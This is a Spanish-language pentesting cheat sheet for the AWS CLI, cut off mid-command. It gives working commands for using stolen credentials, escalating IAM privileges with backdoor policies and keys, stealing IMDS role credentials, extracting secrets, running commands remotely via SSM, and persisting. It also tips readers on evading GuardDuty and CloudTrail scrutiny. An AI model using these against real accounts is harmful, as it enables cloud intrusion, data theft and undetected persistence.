# 🗂️ AWS CLI

## 🧠 Concepto clave

AWS (Amazon Web Services) es la plataforma cloud con mayor cuota de mercado mundial. En un pentest cloud, el objetivo no es explotar vulnerabilidades del kernel ni del SO, sino **misconfiguraciones**: permisos IAM excesivos, buckets S3 públicos, credenciales filtradas, roles asumibles sin restricción y servicios internos expuestos. El 95% de los incidentes de seguridad en cloud son errores del cliente, no de AWS.

La AWS CLI es la interfaz de línea de comandos oficial para interactuar con todos los servicios de AWS de forma programática. En un pentest cloud, es la herramienta principal tanto para reconocimiento como para explotación: una vez obtenidas unas credenciales (Access Key + Secret Key), toda la superficie de ataque se gestiona desde ella.

> [!info] **AWS CLI** 📄 [AWS CLI — Documentación oficial](https://docs.aws.amazon.com/cli/latest/reference/) Interfaz de línea de comandos oficial de Amazon Web Services. Permite interactuar con más de 200 servicios AWS mediante subcomandos estructurados como `aws <servicio> <acción> [opciones]`. En pentesting se usa para enumerar recursos, explotar misconfiguraciones IAM, exfiltrar datos de S3, escalar privilegios y persistir en el entorno. Preinstalada en Kali Linux (`sudo apt install awscli`) o instalable con `pip install awscli`. Requiere Python 3.

|Servicio AWS|Subcomando CLI|Relevancia ofensiva|
|---|---|---|
|Identity & Access Management|`iam`|Enumeración de permisos, escalada de privilegios, persistencia|
|Security Token Service|`sts`|Validar credenciales, asumir roles, obtener identidad|
|Simple Storage Service|`s3` / `s3api`|Exfiltración de datos, buckets públicos, backups expuestos|
|EC2|`ec2`|Reconocimiento de infraestructura, IMDS, snapshots, RCE|
|Secrets Manager|`secretsmanager`|Extracción de credenciales y API keys almacenadas|
|Systems Manager|`ssm`|Ejecución remota de comandos en instancias EC2|
|Lambda|`lambda`|Escalada vía PassRole, extracción de código, RCE|
|CloudTrail|`cloudtrail`|Auditar logs, detectar si hay monitoreo activo|
|STS|`sts`|Federación, tokens temporales, encadenamiento de roles|

## 📌 Puntos importantes

### Sintaxis general de la CLI

```bash
aws [opciones globales] <servicio> <subcomando> [parámetros]
```

Ejemplos de estructura:

- `aws sts get-caller-identity` → sin parámetros adicionales
- `aws s3 ls s3://bucket-name` → con argumento posicional
- `aws iam list-users --output json --region us-east-1` → con flags opcionales

### Opciones globales (aplican a cualquier comando)

|Opción global|Descripción|
|---|---|
|`--profile NOMBRE`|Usa el perfil de credenciales especificado de `~/.aws/credentials`|
|`--region REGION`|Región AWS objetivo (ej: `us-east-1`, `eu-west-1`). Sobreescribe la configurada|
|`--output [json\|text\|table\|yaml]`|Formato de salida. `json` es el más útil para scripting|
|`--query 'expresión'`|Filtro JMESPath sobre el output JSON para extraer campos específicos|
|`--no-sign-request`|No firma la petición. Permite acceder a recursos públicos sin credenciales|
|`--endpoint-url URL`|Sobreescribe el endpoint de AWS. Útil con LocalStack o proxies|
|`--debug`|Muestra el tráfico HTTP completo. Útil para entender qué API calls se hacen|
|`--no-verify-ssl`|Desactiva la verificación del certificado SSL|
|`--color [on\|off\|auto]`|Control del color en el output|
|`--cli-connect-timeout`|Timeout de conexión en segundos|
|`--cli-read-timeout`|Timeout de lectura en segundos|

### Gestión de credenciales y perfiles

Las credenciales AWS se componen de tres valores:

|Componente|Variable de entorno|Descripción|
|---|---|---|
|Access Key ID|`AWS_ACCESS_KEY_ID`|Identificador público. Empieza siempre por `AKIA` (permanente) o `ASIA` (temporal/STS)|
|Secret Access Key|`AWS_SECRET_ACCESS_KEY`|Clave secreta asociada al Access Key ID|
|Session Token|`AWS_SESSION_TOKEN`|Solo en credenciales temporales (roles asumidos, IMDS). Obligatorio cuando el Key ID empieza por `ASIA`|

> [!important] `AKIA` vs `ASIA` — Diferencia crítica en pentest Un Access Key ID que empieza por `AKIA` es una clave **permanente** asociada a un usuario IAM. Una que empieza por `ASIA` es **temporal** (generada por STS al asumir un rol). Las claves temporales tienen fecha de expiración y requieren incluir `AWS_SESSION_TOKEN` en todas las peticiones. Si se usan credenciales `ASIA` sin el token de sesión, todas las llamadas fallarán con `InvalidClientTokenId`.

### `aws configure` — Configuración inicial

> [!info] **aws configure** — Configuración de credenciales Comando interactivo que crea o modifica el fichero `~/.aws/credentials` y `~/.aws/config`. En pentesting se usa para cargar credenciales obtenidas (filtradas en GitHub, extraídas de IMDS, volcadas de un servidor comprometido, etc.).

> [!tip] Configurar credenciales de forma interactiva
> 
> ```bash
> aws configure
> ```
> 
> Solicita en orden: `AWS Access Key ID`, `AWS Secret Access Key`, `Default region name` (ej: `us-east-1`), `Default output format` (usar `json`). Los valores se guardan en `~/.aws/credentials`.

> [!tip] Configurar un perfil con nombre (multi-cuenta)
> 
> ```bash
> aws configure --profile victima
> ```
> 
> `--profile victima` — Crea un perfil separado con nombre. Permite manejar múltiples conjuntos de credenciales simultáneamente. Para usar ese perfil en comandos posteriores: `aws <comando> --profile victima`.

> [!tip] Cargar credenciales temporales con variables de entorno
> 
> ```bash
> export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
> export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
> export AWS_SESSION_TOKEN="AQoDYXdzEJr..."
> ```
> 
> `export AWS_ACCESS_KEY_ID` — Las variables de entorno tienen prioridad sobre `~/.aws/credentials`. Ideal para credenciales temporales (roles asumidos, tokens IMDS) que no conviene escribir en disco.

> [!tip] Verificar la configuración activa de credenciales
> 
> ```bash
> cat ~/.aws/credentials
> cat ~/.aws/config
> ```
> 
> Muestra todos los perfiles configurados. En un sistema comprometido, revisar siempre estos ficheros: pueden contener credenciales de otros entornos (staging, producción, dev).

### `aws sts` — Security Token Service

STS es el servicio de AWS para gestionar credenciales temporales y asumir roles. En pentesting es el punto de partida obligatorio: con `get-caller-identity` se valida cualquier conjunto de credenciales y se obtiene el contexto de la identidad actual.

> [!tip] Validar credenciales e identificar la identidad actual
> 
> ```bash
> aws sts get-caller-identity
> ```
> 
> Devuelve tres campos: `UserId` (identificador único del principal), `Account` (ID numérico de la cuenta AWS, 12 dígitos), `Arn` (ARN completo del principal). Es el equivalente de `whoami` en AWS. No requiere ningún permiso IAM especial: cualquier credencial válida puede ejecutarlo. Si devuelve error, las credenciales son inválidas o han expirado.

**Output de ejemplo:**

```json
{
    "UserId": "AIDACKCEVSQ6C2EXAMPLE",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/jdoe"
}
```

> [!tip] Asumir un rol y obtener credenciales temporales
> 
> ```bash
> aws sts assume-role \
>   --role-arn "arn:aws:iam::123456789012:role/AdminRole" \
>   --role-session-name "pentest-session"
> ```
> 
> `--role-arn` — ARN del rol que se quiere asumir. El rol debe tener una trust policy que permita al principal actual asumirlo. `--role-session-name` — Nombre identificativo de la sesión. Aparece en los logs de CloudTrail. En pentest red team, usar nombres que parezcan legítimos.

Tras ejecutarlo, cargar las credenciales temporales devueltas:

```bash
export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG..."
export AWS_SESSION_TOKEN="AQoDYXdzEJr..."
```

> [!tip] Obtener credenciales de federación que sobreviven a rotación de claves
> 
> ```bash
> aws sts get-federation-token \
>   --name "backup-session" \
>   --duration-seconds 129600
> ```
> 
> `--name` — Nombre de la sesión federada. `--duration-seconds` — Duración en segundos. Máximo 129600 (36 horas). Las credenciales obtenidas con `get-federation-token` **no se invalidan** aunque el usuario IAM cambie su contraseña o rote sus claves, lo que las convierte en un excelente mecanismo de persistencia.

> [!info] **Role Chaining** — Técnica de persistencia avanzada Si se puede asumir un rol A, y ese rol A puede asumir un rol B con más privilegios, se puede encadenar la asunción de roles (`sts:AssumeRole` múltiple). Cada salto renueva el timer de las credenciales temporales. Documentado en HackingTheCloud como "Role Chain Juggling".

### `aws iam` — Identity and Access Management

IAM es el sistema de control de acceso de AWS. Es el servicio más crítico en un pentest cloud: entender los permisos del principal comprometido y encontrar rutas de escalada de privilegios es el objetivo principal de la fase de enumeración.

#### Enumeración de la identidad propia

> [!tip] Obtener información del usuario actual
> 
> ```bash
> aws iam get-user
> ```
> 
> Devuelve el username, ARN, ID, fecha de creación y fecha del último uso de contraseña. Si devuelve `NoSuchEntity`, el principal es un rol (no un usuario), en cuyo caso usar `sts get-caller-identity`.

> [!tip] Listar políticas directamente adjuntas al usuario actual
> 
> ```bash
> aws iam list-attached-user-policies --user-name jdoe
> ```
> 
> `--user-name` — Nombre del usuario IAM. Devuelve las managed policies adjuntas directamente. Las políticas adjuntas definen los permisos del usuario.

> [!tip] Listar políticas inline del usuario
> 
> ```bash
> aws iam list-user-policies --user-name jdoe
> ```
> 
> Devuelve las políticas inline (embebidas directamente en el usuario, no managed policies). Ambas modalidades otorgan permisos: hay que revisar las dos.

> [!tip] Ver el contenido de una política adjunta al usuario
> 
> ```bash
> aws iam get-policy-version \
>   --policy-arn "arn:aws:iam::123456789012:policy/DevPolicy" \
>   --version-id "v1"
> ```
> 
> `--policy-arn` — ARN de la política managed. `--version-id` — Versión a consultar. AWS mantiene versiones de las políticas; la activa se obtiene primero con `get-policy`.

> [!tip] Ver el contenido de una política inline de usuario
> 
> ```bash
> aws iam get-user-policy --user-name jdoe --policy-name DevInlinePolicy
> ```
> 
> `--policy-name` — Nombre de la política inline. Devuelve el documento JSON completo con todas las acciones y recursos permitidos o denegados.

#### Enumeración de grupos

> [!tip] Ver los grupos a los que pertenece el usuario actual
> 
> ```bash
> aws iam list-groups-for-user --user-name jdoe
> ```
> 
> Los grupos heredan permisos: un usuario con pocos permisos propios puede pertenecer a un grupo con `AdministratorAccess`. Siempre revisar los grupos.

> [!tip] Listar las políticas de un grupo
> 
> ```bash
> aws iam list-attached-group-policies --group-name developers
> aws iam list-group-policies --group-name developers
> ```
> 
> El primer comando devuelve managed policies adjuntas al grupo. El segundo devuelve políticas inline. Ambos comandos son necesarios para una enumeración completa.

#### Enumeración global del entorno

> [!tip] Listar todos los usuarios IAM de la cuenta
> 
> ```bash
> aws iam list-users
> ```
> 
> Devuelve todos los usuarios con su ARN, ID, fecha de creación y fecha de último uso de contraseña. Útil para identificar usuarios de servicio, cuentas de CI/CD y administradores.

> [!tip] Listar todos los roles IAM de la cuenta
> 
> ```bash
> aws iam list-roles
> ```
> 
> Lista todos los roles con sus trust policies. Buscar roles con trust policy que incluya `"Principal": "*"` (asumible por cualquiera) o con el propio ARN del usuario como principal de confianza.

> [!tip] Listar todas las políticas managed de la cuenta
> 
> ```bash
> aws iam list-policies --scope Local
> ```
> 
> `--scope Local` — Solo muestra las políticas creadas en la cuenta (no las managed policies de AWS). Las políticas locales suelen ser más permisivas y específicas del entorno.

> [!tip] Obtener el informe de credenciales de la cuenta completa
> 
> ```bash
> aws iam generate-credential-report
> aws iam get-credential-report --output text --query 'Content' | base64 -d
> ```
> 
> `generate-credential-report` — Genera el informe (puede tardar unos segundos). `get-credential-report` — Descarga el informe en base64. Al decodificarlo se obtiene un CSV con todos los usuarios, si tienen MFA, si tienen Access Keys activas, fecha del último uso, etc. Requiere el permiso `iam:GenerateCredentialReport` e `iam:GetCredentialReport`.

#### Escalada de privilegios via IAM

> [!tip] Añadir política de administrador a un usuario (si se tiene iam:AttachUserPolicy)
> 
> ```bash
> aws iam attach-user-policy \
>   --user-name jdoe \
>   --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
> ```
> 
> `--policy-arn` — ARN de la política managed de AWS. `AdministratorAccess` otorga permisos completos sobre todos los recursos de la cuenta. Si el intento devuelve `AccessDenied`, probar con políticas menos restrictivas como `PowerUserAccess` o managed policies de servicios concretos (`SecretsManagerReadWrite`).

> [!tip] Crear una Access Key para otro usuario (si se tiene iam:CreateAccessKey)
> 
> ```bash
> aws iam create-access-key --user-name admin-svc
> ```
> 
> `--user-name` — Usuario objetivo. Devuelve un nuevo `AccessKeyId` + `SecretAccessKey` permanentes para ese usuario. Si el usuario tiene más privilegios que el atacante, esto constituye una escalada de privilegios inmediata. Un usuario puede tener máximo 2 Access Keys activas simultáneamente.

> [!tip] Añadir usuario a un grupo privilegiado (si se tiene iam:AddUserToGroup)
> 
> ```bash
> aws iam add-user-to-group --user-name jdoe --group-name admins
> ```
> 
> `--group-name` — Grupo de destino. Si el grupo tiene `AdministratorAccess`, el usuario hereda esos permisos inmediatamente.

> [!tip] Añadir política inline de administrador a un usuario (si se tiene iam:PutUserPolicy)
> 
> ```bash
> aws iam put-user-policy \
>   --user-name jdoe \
>   --policy-name backdoor-admin \
>   --policy-document '{
>     "Version":"2012-10-17",
>     "Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]
>   }'
> ```
> 
> `--policy-document` — Documento JSON de política inline. `"Action":"*"` con `"Resource":"*"` es el equivalente a `AdministratorAccess` como política inline. Más difícil de detectar en auditorías rápidas que una managed policy adjunta.

> [!important] Modificaciones IAM — Altamente detectables en CloudTrail Cada llamada a la API de IAM (attach-user-policy, create-access-key, add-user-to-group, etc.) genera un evento en CloudTrail con el ARN del principal que lo ejecutó, timestamp, IP de origen y parámetros completos. En entornos con GuardDuty activo, crear Access Keys para otros usuarios o adjuntar AdministratorAccess a una cuenta generará alertas inmediatas. Evaluar siempre si el entorno tiene GuardDuty antes de proceder (`aws guardduty list-detectors`).

### `aws s3` y `aws s3api` — Simple Storage Service

S3 es el servicio de almacenamiento de objetos de AWS. Los buckets S3 mal configurados han sido protagonistas de múltiples brechas de datos masivas. La diferencia entre `s3` y `s3api` es que `s3` ofrece comandos de alto nivel (similares a comandos Unix) y `s3api` expone la API REST de S3 directamente con más control.

> [!tip] Listar todos los buckets de la cuenta
> 
> ```bash
> aws s3 ls
> ```
> 
> Sin argumentos, lista todos los buckets S3 de la cuenta autenticada. Devuelve nombre y fecha de creación. Si se tienen credenciales de una cuenta comprometida, esta es la primera enumeración a realizar.

> [!tip] Listar el contenido de un bucket específico
> 
> ```bash
> aws s3 ls s3://nombre-del-bucket/
> ```
> 
> `s3://nombre-del-bucket/` — URI del bucket en formato S3. La barra final es opcional pero recomendable. Lista los objetos y prefijos (carpetas) del nivel raíz.

> [!tip] Listar contenido de forma recursiva (todos los objetos)
> 
> ```bash
> aws s3 ls s3://nombre-del-bucket/ --recursive --human-readable
> ```
> 
> `--recursive` — Lista todos los objetos en todos los "directorios" del bucket. `--human-readable` — Muestra el tamaño en formato legible (KB, MB, GB).

> [!tip] Acceder a un bucket público SIN credenciales
> 
> ```bash
> aws s3 ls s3://nombre-del-bucket/ --no-sign-request
> ```
> 
> `--no-sign-request` — Envía la petición sin firmar, es decir, sin credenciales. Si el bucket tiene ACL pública o una bucket policy que permite acceso anónimo, esto funciona. Este es el comando para comprobar si un bucket es accesible públicamente desde internet.

> [!tip] Descargar un objeto de S3
> 
> ```bash
> aws s3 cp s3://nombre-del-bucket/ruta/fichero.txt ./fichero-local.txt
> ```
> 
> `cp` — Copia un objeto de S3 al sistema local (o viceversa). Equivalente a `wget` pero para S3.

> [!tip] Descargar todo el contenido de un bucket
> 
> ```bash
> aws s3 sync s3://nombre-del-bucket/ ./bucket-local/ --no-sign-request
> ```
> 
> `sync` — Sincroniza el contenido del bucket con el directorio local, descargando solo los objetos que no existen o han cambiado. `--no-sign-request` — Para buckets públicos sin credenciales.

> [!tip] Subir un fichero a un bucket (comprobación de escritura)
> 
> ```bash
> aws s3 cp ./test.txt s3://nombre-del-bucket/pentest-write-check.txt --no-sign-request
> ```
> 
> Si el comando tiene éxito, el bucket permite escritura anónima. En bug bounty y pentesting, usar un nombre de fichero único y no sobreescribir ficheros existentes para evitar daño colateral.

> [!tip] Leer el contenido de un objeto directamente en terminal (sin descargar)
> 
> ```bash
> aws s3 cp s3://nombre-del-bucket/config/database.yml -
> ```
> 
> `-` — El guión como destino redirige el contenido del objeto a STDOUT. Permite leer ficheros de texto directamente sin crear ficheros locales temporales.

> [!tip] Obtener la ACL de un bucket (s3api)
> 
> ```bash
> aws s3api get-bucket-acl --bucket nombre-del-bucket
> ```
> 
> Devuelve la Access Control List del bucket. Buscar grants con `"URI": "http://acs.amazonaws.com/groups/global/AllUsers"` (acceso público) o `"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"` (cualquier cuenta AWS autenticada).

> [!tip] Obtener la bucket policy (s3api)
> 
> ```bash
> aws s3api get-bucket-policy --bucket nombre-del-bucket | python3 -m json.tool
> ```
> 
> `get-bucket-policy` — Devuelve la policy del bucket en JSON. Buscar statements con `"Effect": "Allow"` y `"Principal": "*"` que indican acceso público. El pipe a `python3 -m json.tool` formatea el JSON para legibilidad.

> [!tip] Verificar si el bucket bloquea el acceso público
> 
> ```bash
> aws s3api get-public-access-block --bucket nombre-del-bucket
> ```
> 
> Devuelve cuatro booleanos (`BlockPublicAcls`, `IgnorePublicAcls`, `BlockPublicPolicy`, `RestrictPublicBuckets`). Si todos son `true`, el bucket no puede ser público aunque la ACL o policy lo indiquen. Si alguno es `false`, puede haber exposición.

> [!tip] Listar versiones de objetos (buscar versiones eliminadas con datos)
> 
> ```bash
> aws s3api list-object-versions --bucket nombre-del-bucket
> ```
> 
> Si el bucket tiene versionado habilitado, este comando muestra todas las versiones de todos los objetos, incluidos los marcados como eliminados (`DeleteMarkers`). Un objeto "borrado" puede seguir accesible recuperando una versión anterior. Útil para encontrar datos que se creía eliminados.

### `aws ec2` — Elastic Compute Cloud

EC2 es el servicio de instancias virtuales de AWS. En pentesting, es relevante para reconocimiento de infraestructura, acceso a snapshots de disco con datos sensibles y explotación del Instance Metadata Service (IMDS).

> [!tip] Listar todas las instancias EC2 de la cuenta
> 
> ```bash
> aws ec2 describe-instances \
>   --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,PrivateIpAddress,Tags[?Key==`Name`].Value|[0]]' \
>   --output table
> ```
> 
> `describe-instances` — Lista todas las instancias con su estado, IPs y tags. `--query` — JMESPath para extraer solo los campos relevantes: ID, estado, IP pública, IP privada y nombre del tag. `--output table` — Formato tabular más legible que JSON para este caso.

> [!tip] Listar snapshots públicos de la cuenta (pueden contener datos sensibles)
> 
> ```bash
> aws ec2 describe-snapshots --owner-ids 123456789012
> ```
> 
> `--owner-ids` — ID de cuenta AWS (12 dígitos obtenidos con `sts get-caller-identity`). Lista todos los snapshots EBS de la cuenta. Los snapshots son copias de disco completas: si alguno es público (`--restorable-by-user-ids all`), cualquier persona puede crear un volumen a partir de él y montar su contenido.

> [!tip] Buscar snapshots públicos de una cuenta objetivo
> 
> ```bash
> aws ec2 describe-snapshots \
>   --owner-ids 123456789012 \
>   --restorable-by-user-ids all
> ```
> 
> `--restorable-by-user-ids all` — Filtra únicamente los snapshots que son accesibles públicamente. Un snapshot público de un disco de sistema puede contener ficheros de configuración, credenciales hardcoded, bases de datos y cualquier otro dato que estuviera en el disco en el momento del snapshot.

> [!tip] Listar Security Groups y sus reglas
> 
> ```bash
> aws ec2 describe-security-groups \
>   --query 'SecurityGroups[*].[GroupId,GroupName,Description,IpPermissions]'
> ```
> 
> Identifica security groups con reglas `0.0.0.0/0` en puertos críticos (22, 3389, 445, etc.) que exponen servicios directamente a internet.

> [!tip] Listar pares de claves SSH registrados
> 
> ```bash
> aws ec2 describe-key-pairs
> ```
> 
> Lista los nombres de los pares de claves SSH registrados en la cuenta. Si se puede crear una nueva instancia EC2 (`ec2:RunInstances`), se puede asociar un key pair propio para acceder por SSH.

#### IMDS — Instance Metadata Service (desde dentro de una EC2)

El IMDS es un endpoint HTTP disponible en `169.254.169.254` dentro de cualquier instancia EC2. Almacena metadatos de la instancia, incluyendo las credenciales IAM temporales del rol asociado. Su explotación es uno de los vectores más frecuentes en cloud pentesting (SSRF → IMDS → credenciales IAM).

> [!tip] Obtener credenciales IAM desde el IMDS (IMDSv1)
> 
> ```bash
> curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
> curl http://169.254.169.254/latest/meta-data/iam/security-credentials/NOMBRE-ROL
> ```
> 
> La primera petición devuelve el nombre del rol adjunto a la instancia. La segunda devuelve las credenciales temporales (AccessKeyId, SecretAccessKey, Token, Expiration) del rol. Con estas credenciales se opera con los permisos del rol de la instancia, potencialmente elevados.

> [!tip] Obtener credenciales IAM desde el IMDS (IMDSv2 — requiere token previo)
> 
> ```bash
> TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
>   -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
> curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
>   -H "X-aws-ec2-metadata-token: $TOKEN"
> ```
> 
> `IMDSv2` — La versión 2 del IMDS requiere obtener primero un token de sesión mediante una petición PUT. Este mecanismo protege contra SSRF simples que no pueden hacer peticiones PUT. Sin embargo, si hay SSRF con control total sobre headers y método HTTP, sigue siendo explotable.

> [!tip] Obtener user-data de la instancia (puede contener secretos)
> 
> ```bash
> curl http://169.254.169.254/latest/user-data
> ```
> 
> El user-data es un script que se ejecuta en el arranque de la instancia. Es frecuente encontrar credenciales hardcoded, tokens de API, contraseñas de base de datos y configuraciones sensibles en texto claro o en base64 trivialmente decodificable.

### `aws secretsmanager` — Secrets Manager

Secrets Manager es el servicio de AWS para almacenar secretos (contraseñas, API keys, cadenas de conexión a bases de datos). En un pentest, si se tienen permisos de lectura, es un tesoro.

> [!tip] Listar todos los secretos almacenados
> 
> ```bash
> aws secretsmanager list-secrets
> ```
> 
> Devuelve los nombres y ARNs de todos los secretos. Los nombres suelen ser descriptivos: `prod/database/password`, `api/stripe/key`, `jenkins/admin/credentials`. Sin el permiso `secretsmanager:ListSecrets` este comando fallará, pero los ARNs a veces son predecibles.

> [!tip] Obtener el valor de un secreto específico
> 
> ```bash
> aws secretsmanager get-secret-value \
>   --secret-id "prod/database/password"
> ```
> 
> `--secret-id` — Nombre o ARN del secreto. Devuelve `SecretString` (si es texto) o `SecretBinary` (si es binario, en base64). Este es el comando de exfiltración directo: si se tiene `secretsmanager:GetSecretValue`, se obtiene el secreto en texto claro.

> [!tip] Obtener valor de un secreto por ARN completo
> 
> ```bash
> aws secretsmanager get-secret-value \
>   --secret-id "arn:aws:secretsmanager:us-east-1:123456789012:secret:prod/db/password-AbCdEf"
> ```
> 
> `--secret-id` — ARN completo. Útil cuando se conoce el ARN pero no el nombre, o cuando se intentan ARNs predecibles de otros secretos.

### `aws ssm` — Systems Manager

SSM Parameter Store es otro almacén de configuración/secretos. SSM Session Manager permite ejecutar comandos en instancias EC2 sin necesidad de SSH.

> [!tip] Listar parámetros almacenados en Parameter Store
> 
> ```bash
> aws ssm describe-parameters
> ```
> 
> Lista todos los parámetros. Los de tipo `SecureString` están cifrados con KMS pero pueden recuperarse con el permiso adecuado. Buscar nombres como `password`, `secret`, `key`, `token`.

> [!tip] Obtener el valor de un parámetro (incluyendo SecureString)
> 
> ```bash
> aws ssm get-parameter \
>   --name "/prod/database/password" \
>   --with-decryption
> ```
> 
> `--name` — Nombre del parámetro (respeta la jerarquía de rutas con `/`). `--with-decryption` — Descifra automáticamente los parámetros de tipo `SecureString`. Sin este flag, los parámetros cifrados se devuelven cifrados.

> [!tip] Ejecutar un comando en una instancia EC2 vía SSM (sin SSH)
> 
> ```bash
> aws ssm send-command \
>   --instance-ids "i-0123456789abcdef0" \
>   --document-name "AWS-RunShellScript" \
>   --parameters 'commands=["id && cat /etc/passwd"]'
> ```
> 
> `--instance-ids` — ID de la instancia EC2 objetivo. Requiere que el SSM Agent esté instalado y activo en la instancia. `--document-name "AWS-RunShellScript"` — Documento SSM para ejecutar comandos shell en Linux. `--parameters 'commands=[...]'` — Array de comandos a ejecutar. Si se tiene el permiso `ssm:SendCommand`, esto equivale a RCE en la instancia sin necesidad de abrir el puerto 22.

> [!tip] Iniciar una sesión interactiva de shell en una EC2 vía SSM
> 
> ```bash
> aws ssm start-session --target "i-0123456789abcdef0"
> ```
> 
> `--target` — ID de la instancia. Abre una sesión de shell interactiva similar a SSH pero usando el canal cifrado de SSM. No requiere Security Group con puerto 22 abierto ni key pair SSH. Requiere el permiso `ssm:StartSession`.

### `aws lambda` — Lambda

Lambda es el servicio de funciones serverless de AWS. En pentesting es relevante para escalada de privilegios (PassRole + CreateFunction) y para extraer código de funciones que puede contener credenciales hardcoded.

> [!tip] Listar todas las funciones Lambda de la cuenta
> 
> ```bash
> aws lambda list-functions
> ```
> 
> Devuelve todas las funciones con su nombre, runtime, ARN del rol asociado y descripción. El rol asociado (`Role`) indica los permisos que tiene la función: si el rol tiene `AdministratorAccess`, crear y ejecutar una función con ese rol equivale a escalada completa.

> [!tip] Descargar el código fuente de una función Lambda
> 
> ```bash
> aws lambda get-function --function-name nombre-funcion \
>   --query 'Code.Location' --output text | xargs curl -o funcion.zip
> ```
> 
> `get-function` — Devuelve metadata de la función incluyendo una URL presignada de S3 para descargar el código fuente (válida ~10 minutos). `--query 'Code.Location'` — Extrae solo la URL de descarga. `xargs curl -o funcion.zip` — Descarga el ZIP con el código. Una vez descargado, descomprimirlo y buscar credenciales hardcoded, connection strings y tokens de API.

> [!tip] Crear una función Lambda con un rol privilegiado (escalada via PassRole)
> 
> ```bash
> aws lambda create-function \
>   --function-name backdoor-admin \
>   --runtime python3.12 \
>   --role "arn:aws:iam::123456789012:role/AdminRole" \
>   --handler lambda_function.lambda_handler \
>   --zip-file fileb://payload.zip
> ```
> 
> `--role` — ARN del rol a pasar a la función. Si se tiene `iam:PassRole` + `lambda:CreateFunction`, se puede pasar un rol con más privilegios que el propio usuario a la función. El código de la función se ejecutará con los permisos de ese rol. `--zip-file` — Fichero ZIP con el código de la función.

> [!tip] Invocar una función Lambda y capturar el output
> 
> ```bash
> aws lambda invoke \
>   --function-name backdoor-admin \
>   --payload '{}' \
>   output.json && cat output.json
> ```
> 
> `--payload` — Evento JSON a pasar como input a la función. `'{}'` es un evento vacío. `output.json` — Fichero donde se guarda el output de la invocación.

### `aws cloudtrail` — Auditoría y evasión de detección

CloudTrail registra todas las llamadas a la API de AWS. En un pentest, es importante saber si CloudTrail está activo para evaluar el riesgo de detección.

> [!tip] Verificar si CloudTrail está activo
> 
> ```bash
> aws cloudtrail describe-trails
> aws cloudtrail get-trail-status --name nombre-trail
> ```
> 
> `describe-trails` — Lista todos los trails configurados y en qué regiones aplican. Un trail con `IsMultiRegionTrail: true` captura eventos de todas las regiones. `get-trail-status` — Muestra si el trail está activo (`IsLogging: true`) y cuándo fue el último evento entregado.

> [!tip] Buscar eventos recientes en CloudTrail (puede revelar otras actividades)
> 
> ```bash
> aws cloudtrail lookup-events \
>   --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin \
>   --max-results 10
> ```
> 
> `--lookup-attributes` — Filtra eventos por nombre, username, resource, etc. Útil para ver qué acciones se han realizado recientemente desde la cuenta comprometida. También puede revelar si hay otras sesiones activas o si el equipo de seguridad está investigando.

> [!tip] Comprobar si GuardDuty está habilitado
> 
> ```bash
> aws guardduty list-detectors
> ```
> 
> Si devuelve una lista con IDs, GuardDuty está activo en esa región. GuardDuty detecta automáticamente comportamientos anómalos como: uso de credenciales desde IPs de Tor, llamadas inusuales a la API, enumeración masiva de recursos, exfiltración de datos de S3, y uso de herramientas de pentesting conocidas (Pacu, ScoutSuite).

> [!important] Evasión de GuardDuty — `AWS_EXECUTION_ENV` GuardDuty usa el User-Agent de las llamadas a la API para detectar herramientas de pentesting conocidas. Es posible modificar el User-Agent añadiendo la variable de entorno `AWS_EXECUTION_ENV` antes de ejecutar comandos: `export AWS_EXECUTION_ENV="AWS_Lambda_python3.12"`. Esto hace que el User-Agent parezca una llamada legítima de Lambda en lugar de la CLI estándar, reduciendo la probabilidad de triggear alertas de GuardDuty relacionadas con herramientas de pentest.

## 📋 Flujos de trabajo completos

### Flujo 1 — Credenciales obtenidas: reconocimiento inicial

Cuando se obtienen credenciales AWS (filtradas en GitHub, en variables de entorno de un servidor comprometido, en un fichero `.env`, etc.), la secuencia de reconocimiento inicial es siempre la misma.

**Paso 1 — Validar credenciales e identificar el contexto**

> [!tip] Identificar la identidad y cuenta de las credenciales obtenidas
> 
> ```bash
> aws sts get-caller-identity
> ```
> 
> Primer comando siempre. Determina: si las credenciales son válidas, si pertenecen a un usuario o rol, el ID de cuenta (para construir ARNs) y el ARN exacto del principal.

**Paso 2 — Enumerar permisos propios**

> [!tip] Listar políticas adjuntas al usuario comprometido
> 
> ```bash
> aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d'/' -f2)
> aws iam list-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d'/' -f2)
> aws iam list-groups-for-user --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d'/' -f2)
> ```
> 
> Los tres comandos combinados dan una imagen completa de los permisos directos del usuario: managed policies, inline policies y grupos.

**Paso 3 — Reconocimiento de recursos**

> [!tip] Inventario rápido de recursos principales
> 
> ```bash
> aws s3 ls
> aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress]' --output table
> aws lambda list-functions --query 'Functions[*].[FunctionName,Role]' --output table
> aws secretsmanager list-secrets --query 'SecretList[*].Name' --output table
> aws ssm describe-parameters --query 'Parameters[*].Name' --output table
> ```
> 
> Ejecutar en orden. Cada comando que tenga éxito indica qué servicios tiene permisos para leer el principal comprometido. Los que fallen con `AccessDenied` revelan los servicios sin acceso.

---

### Flujo 2 — Escalada de privilegios via iam:PassRole + lambda:CreateFunction

Este es uno de los caminos de escalada de privilegios más frecuentes en entornos AWS. Se requiere: tener `iam:PassRole`, `lambda:CreateFunction` y `lambda:InvokeFunction`, y que exista un rol con más privilegios que el atacante que pueda ser pasado a Lambda.

**Paso 1 — Identificar roles asignables a Lambda con más privilegios**

> [!tip] Buscar roles con trust policy para Lambda
> 
> ```bash
> aws iam list-roles \
